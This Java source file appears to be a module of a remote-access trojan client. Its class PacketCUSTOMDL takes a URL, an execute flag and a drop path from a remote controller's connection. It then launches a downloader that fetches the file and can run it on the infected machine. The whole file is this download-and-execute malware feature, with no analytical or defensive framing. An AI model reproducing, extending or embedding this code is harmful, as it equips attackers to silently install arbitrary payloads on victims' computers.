package com.redpois0n.packets;

import com.redpois0n.AdvDownloader;
import com.redpois0n.Connection;

public class PacketCUSTOMDL extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		String url = Connection.readLine();
		boolean exec = Boolean.parseBoolean(Connection.readLine());
		String drop = Connection.readLine().toLowerCase();
		new AdvDownloader(url, exec, drop).start();
	}

}
